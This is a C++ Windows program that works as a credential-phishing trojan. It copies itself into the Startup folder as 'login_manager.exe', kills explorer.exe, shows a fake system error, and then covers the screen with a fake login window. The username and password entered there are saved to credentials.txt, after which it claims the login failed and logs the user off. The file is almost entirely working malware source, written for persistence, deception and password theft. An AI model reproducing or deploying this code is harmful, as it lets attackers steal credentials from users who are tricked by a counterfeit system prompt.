#define UNICODE

#include <windows.h>
#include <fstream>
#include <iostream>
#include <ws2tcpip.h>
#include <shlobj_core.h>
#include <wchar.h>

#define USERNAME_LABEL_W 120
#define LABEL_H 30
#define PASSWORD_LABEL_W 120
#define INPUT_W 200

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

HWND usernameInput;
HWND passwordInput;

void AddToAutostart() {
    LPWSTR current_path = L"";
    LPWSTR target_path = L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\login_manager.exe";

    LPWSTR appdata_folder = L"";

    GetModuleFileName(NULL, current_path, MAX_PATH);
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &appdata_folder);
    unsigned int l = wcslen(appdata_folder);
    wcscpy(&appdata_folder[l], target_path);

    if (wcscmp(appdata_folder, current_path) == 0) return;

    CopyFile(current_path, appdata_folder, 0);

    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;
    memset(&startup_info, 0, sizeof(STARTUPINFO));
    startup_info.cb = sizeof(STARTUPINFO);
    memset(&process_info, 0, sizeof(PROCESS_INFORMATION));

    BOOL rv = CreateProcess(
            appdata_folder,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info
    );


    exit(0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AddToAutostart();

    HKEY hKey;
    DWORD dwDisposition;
    DWORD shouldTerminate = 1;
    DWORD dwType = REG_DWORD;
    DWORD dwSize = sizeof(DWORD);

    if (RegCreateKeyEx(HKEY_CURRENT_USER, L"LOGIN_MANAGER\\Client", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
                       &hKey, &dwDisposition) == ERROR_SUCCESS) {
        RegQueryValueEx(hKey, L"ShouldTerminate", NULL, &dwType, (LPBYTE) &shouldTerminate, &dwSize);

        shouldTerminate = !shouldTerminate;

        if (shouldTerminate) {
            RegDeleteKey(HKEY_CURRENT_USER, L"LOGIN_MANAGER\\Client");

            ExitProcess(0);
        }

        RegSetValueEx(hKey, L"ShouldTerminate", 0, REG_DWORD, (const BYTE *) &shouldTerminate, sizeof(DWORD));

        RegCloseKey(hKey);
    }

    system("taskkill /f /im explorer.exe");

    MessageBox(NULL, L"Internal Windows error!", L"System error", MB_ICONERROR | MB_OK);

    // Create window class
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"MyWindowClass";

    // Register window class
    RegisterClass(&wc);

    // Create window
    HWND hwnd = CreateWindowEx(0, // Remove WS_EX_TOPMOST, WS_EX_LAYERED, and WS_EX_TRANSPARENT
                               L"MyWindowClass", L"", WS_POPUP | WS_VISIBLE,
                               0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                               NULL, NULL, hInstance, NULL);

    // Set transparency
    SetLayeredWindowAttributes(hwnd, 0, 255, LWA_ALPHA);

    // Create logo image control
    HWND logoImage = CreateWindow(L"STATIC", NULL, WS_CHILD | WS_VISIBLE | SS_BITMAP,
                                  0, 0, 0, 0, hwnd, NULL, hInstance, NULL);

    // Load image from file
    HBITMAP hBitmap = (HBITMAP) LoadImage(NULL, L"logo.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

    // Set image as background for logo control
    SendMessage(logoImage, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM) hBitmap);


    // Create labels and input fields
    HWND usernameLabel = CreateWindow(L"STATIC", L"Username", WS_CHILD | WS_VISIBLE | SS_LEFT,
                                      0, 0, 100, 20, hwnd, NULL, hInstance, NULL);
    usernameInput = CreateWindow(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                                 0, 0, 200, 20, hwnd, NULL, hInstance, NULL);
    HWND passwordLabel = CreateWindow(L"STATIC", L"Password", WS_CHILD | WS_VISIBLE | SS_LEFT,
                                      0, 0, 100, 20, hwnd, NULL, hInstance, NULL);
    passwordInput = CreateWindow(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD | ES_AUTOHSCROLL,
                                 0, 0, 200, 20, hwnd, NULL, hInstance, NULL);
    HWND loginButton = CreateWindow(
            L"BUTTON",
            L"Login",
            WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
            0,
            0,
            0,
            0,
            hwnd,
            NULL,
            hInstance,
            NULL);


    HFONT hFont = (HFONT) GetStockObject(DEFAULT_GUI_FONT);
    LOGFONT lf;
    GetObject(hFont, sizeof(lf), &lf);
    lf.lfHeight = lf.lfHeight * 2;
    HFONT hNewFont = CreateFontIndirect(&lf);
    SendMessage(logoImage, WM_SETFONT, (WPARAM) hNewFont, TRUE);
    SendMessage(usernameLabel, WM_SETFONT, (WPARAM) hNewFont, TRUE);
    SendMessage(usernameInput, WM_SETFONT, (WPARAM) hNewFont, TRUE);
    SendMessage(passwordLabel, WM_SETFONT, (WPARAM) hNewFont, TRUE);
    SendMessage(passwordInput, WM_SETFONT, (WPARAM) hNewFont, TRUE);
    SendMessage(loginButton, WM_SETFONT, (WPARAM) hNewFont, TRUE);

    // Position labels and input fields in the middle of the window
    RECT rect;
    GetClientRect(hwnd, &rect);
    // Get window size
    int windowWidth = rect.right - rect.left;
    int windowHeight = rect.bottom - rect.top;

    int x = (rect.right - rect.left) / 2 - (PASSWORD_LABEL_W + INPUT_W) / 2;
    int y = (rect.bottom - rect.top) / 2 - LABEL_H;

    MoveWindow(usernameLabel, x, y, USERNAME_LABEL_W, LABEL_H, TRUE);
    MoveWindow(usernameInput, x + USERNAME_LABEL_W, y, INPUT_W, LABEL_H, TRUE);
    MoveWindow(passwordLabel, x, y + LABEL_H, PASSWORD_LABEL_W, LABEL_H, TRUE);
    MoveWindow(passwordInput, x + PASSWORD_LABEL_W, y + LABEL_H, INPUT_W, LABEL_H, TRUE);
    MoveWindow(loginButton, windowWidth / 2 - INPUT_W / 2, y + LABEL_H * 3, INPUT_W, LABEL_H, TRUE);


    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    int imageWidth = bmp.bmWidth;
    int imageHeight = bmp.bmHeight;

    int imageX = (windowWidth - imageWidth) / 2;
//    int imageY = (windowHeight - imageHeight - 40 - 20) / 2;
    int imageY = 0;
    SetWindowPos(logoImage, HWND_TOP, imageX, imageY, imageWidth, imageHeight, SWP_SHOWWINDOW);

    // Main message loop
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Destroy window
    DestroyWindow(hwnd);

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_ERASEBKGND: {
            RECT rect;
            GetClientRect(hwnd, &rect);
            HBRUSH brush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect((HDC) wParam, &rect, brush);
            DeleteObject(brush);
            return 1;
        }
        case WM_COMMAND:
            if (HIWORD(wParam) == BN_CLICKED) {
                // Get the text from the username and password input fields
                char username[256];
                char password[256];
                GetWindowTextA(usernameInput, username, 256);
                GetWindowTextA(passwordInput, password, 256);

                // Open the credentials.txt file for writing
                std::ofstream outfile("credentials.txt", std::ios_base::app);

                if (outfile.is_open()) {
                    // Write the username and password to the file
                    outfile << "Username: " << username << std::endl;
                    outfile << "Password: " << password << std::endl;
                    outfile.close();
                }
                MessageBox(NULL, L"Incorrect username or password", L"Error!", MB_ICONERROR | MB_OK);
                ExitWindowsEx(EWX_LOGOFF, 0);
            }
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}
